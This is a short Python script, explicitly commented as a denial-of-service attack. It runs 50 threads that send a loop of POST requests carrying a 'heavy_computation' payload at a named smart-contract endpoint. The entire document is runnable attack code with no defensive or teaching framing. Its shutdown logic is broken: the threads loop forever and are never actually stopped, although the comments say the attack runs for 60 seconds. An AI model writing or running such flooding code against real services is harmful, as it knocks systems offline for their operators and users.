import requests
import threading
import time

# Target URL for the DoS attack
TARGET_URL = 'http://vulnerable-smart-contract.com/perform_action'

# Number of threads for the attack
NUM_THREADS = 50

# Data payload for the attack
PAYLOAD = {
    'action': 'heavy_computation',
    'amount': 1000
}

def perform_dos_attack():
    def attack():
        while True:
            try:
                response = requests.post(TARGET_URL, json=PAYLOAD)
                if response.status_code == 200:
                    print("Request successful.")
                else:
                    print("Failed request:", response.status_code)
            except requests.exceptions.RequestException as e:
                print("Request failed:", e)
            time.sleep(0.1)  # Small delay between requests

    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    # Let the attack run for 60 seconds
    time.sleep(60)

    # Stop all threads (rudimentary way to stop threads; replace with more sophisticated control if necessary)
    for thread in threads:
        thread.join(timeout=1)
        if thread.is_alive():
            print("Thread still alive; terminating.")

perform_dos_attack()
